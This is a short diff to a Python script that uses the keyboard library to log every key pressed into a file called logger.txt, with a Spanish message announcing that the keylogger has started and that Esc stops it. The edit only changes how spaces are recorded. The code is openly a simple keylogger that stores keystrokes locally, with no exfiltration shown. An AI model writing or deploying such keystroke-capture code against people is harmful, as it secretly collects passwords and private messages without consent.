@@ -2,7 +2,7 @@ import keyboard
 def on_key(event):
     with open('logger.txt', 'a') as file:
         if event.name == 'space':
-            file.write('')
+            file.write(' ')
         else:
             file.write(event.name)
 print("Keylogger iniciado. Presiona 'Esc' para detener.")
